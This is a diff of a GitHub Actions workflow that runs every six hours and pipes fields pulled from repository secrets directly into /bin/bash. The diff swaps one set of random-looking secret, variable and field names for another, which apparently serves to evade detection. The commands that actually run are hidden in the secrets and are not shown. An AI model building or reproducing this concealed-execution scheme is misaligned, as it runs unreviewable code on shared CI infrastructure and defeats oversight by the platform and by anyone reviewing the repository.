@@ -1,26 +1,21 @@
 name: wenmingcy
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '48 0/6 * * *'
+    - cron: '43 4/6 * * *'
 
-jobs:  # 25009
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: wenmingcy
         env:
-          v8351: ${{ secrets.v8351 }}
+          ej12457: ${{ secrets.ej12457 }}
         run: |
-          echo $v8351 | jq -r .kvqi2175 | /bin/bash
-          echo $k883 | jq -r .e26230 | /bin/bash
-          echo $z58651 | jq -r .nf3 | /bin/bash
-          echo $qlznf3 | jq -r .czqk79785 | /bin/bash
-          echo $d46172 | jq -r .o07786 | /bin/bash
-          echo $y82 | jq -r .wpd325 | /bin/bash
-          echo $j412 | jq -r .fmv9358 | /bin/bash
-          echo $plki84487 | jq -r .boon4624 | /bin/bash
-          echo $vzym5 | jq -r .kk1897 | /bin/bash
-          echo $cuel7819 | jq -r .q322 | /bin/bash
+          echo $ej12457 | jq -r .iedhq69882 | /bin/bash
+          echo $k1228 | jq -r .mrtpt8995 | /bin/bash
+          echo $ulm3764 | jq -r .nd8 | /bin/bash
+          echo $zgq8375 | jq -r .cd371 | /bin/bash
 
